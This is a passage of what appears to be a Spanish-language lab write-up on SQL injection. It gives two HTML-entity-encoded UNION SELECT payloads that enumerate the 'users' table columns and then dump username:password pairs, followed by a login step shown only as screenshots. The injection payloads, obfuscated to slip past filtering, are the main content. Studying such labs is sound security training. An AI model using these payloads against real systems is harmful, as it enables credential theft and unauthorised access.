payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#99;&#111;&#108;&#117;&#109;&#110;&#95;&#110;&#97;&#109;&#101;&#32;&#70;&#82;&#79;&#77;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#95;&#115;&#99;&#104;&#101;&#109;&#97;&#46;&#99;&#111;&#108;&#117;&#109;&#110;&#115;&#32;&#87;&#72;&#69;&#82;&#69;&#32;&#116;&#97;&#98;&#108;&#101;&#95;&#110;&#97;&#109;&#101;&#61;&#39;&#117;&#115;&#101;&#114;&#115;&#39;'
```

<figure><img src="../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>

Extraemos toda la información.

```
# UNION SELECT username||':'||password FROM users
payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#124;&#124;&#39;&#58;&#39;&#124;&#124;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;'
```

<figure><img src="../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos logueamos.

<figure><img src="../../.gitbook/assets/image (1469).png" alt=""><figcaption></figcaption></figure>
